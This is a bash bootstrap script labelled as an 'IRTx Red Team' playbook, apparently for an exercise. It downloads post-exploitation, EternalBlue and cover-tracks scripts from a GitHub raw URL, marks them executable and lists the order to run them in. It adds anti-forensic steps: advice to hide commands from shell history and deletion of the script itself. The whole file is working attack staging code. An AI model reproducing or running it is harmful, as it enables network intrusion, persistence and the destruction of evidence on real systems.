#!/bin/bash

# =============================================================
# IRTx Red Team - Blackbox Bootstrap
# DataBreach | Red Team Playbook
# =============================================================

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RESET='\033[0m'

echo -e "${RED}"
echo "  ██████╗  ██████╗  ██████╗ ████████╗███████╗████████╗██████╗  █████╗ ██████╗ "
echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗"
echo "  ██████╔╝██║   ██║██║   ██║   ██║   ███████╗   ██║   ██████╔╝███████║██████╔╝"
echo "  ██╔══██╗██║   ██║██║   ██║   ██║   ╚════██║   ██║   ██╔══██╗██╔══██║██╔═══╝ "
echo "  ██████╔╝╚██████╔╝╚██████╔╝   ██║   ███████║   ██║   ██║  ██║██║  ██║██║     "
echo "  ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     "
echo -e "${CYAN}              IRTx Red Team — Blackbox Bootstrap${RESET}"
echo -e "${YELLOW}                         DataBreach${RESET}"
echo ""

# =============================================================
# UPDATE THIS WITH YOUR ACTUAL GITHUB RAW URL BASE
# =============================================================
GITHUB_BASE="https://raw.githubusercontent.com/Tafecyber/irtx-redteam-scripts/main"

SCRIPTS=(
  "post_exploit.sh"
  "cover_tracks.sh"
  "eternal.sh"
)

echo -e "${YELLOW}[+] Downloading Red Team scripts from GitHub...${RESET}"
echo ""

for script in "${SCRIPTS[@]}"; do
  wget -q "$GITHUB_BASE/$script" -O "$script"
  if [[ $? -eq 0 ]]; then
    chmod +x "$script"
    echo -e "  ${GREEN}[✓] $script downloaded and ready.${RESET}"
  else
    echo -e "  ${RED}[!] Failed to download: $script${RESET}"
  fi
done

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${GREEN}  All scripts downloaded — run in this order:${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "  1. ${YELLOW}bash post_exploit.sh${RESET}   — persistence + internal scan"
echo -e "  2. ${YELLOW}bash eternal.sh${RESET}        — EternalBlue on Windows Server"
echo -e "  3. ${YELLOW}bash cover_tracks.sh${RESET}   — cleanup when done"
echo ""

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${YELLOW}  ║  OPSEC REMINDER — From this point forward:      ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Use a SPACE before every command you type       ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  manually so it is excluded from shell history.  ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Example:  [SPACE]bash post_exploit.sh           ║${RESET}"
echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════╝${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# Self delete bootstrap
rm -f bootstrap.sh 2>/dev/null
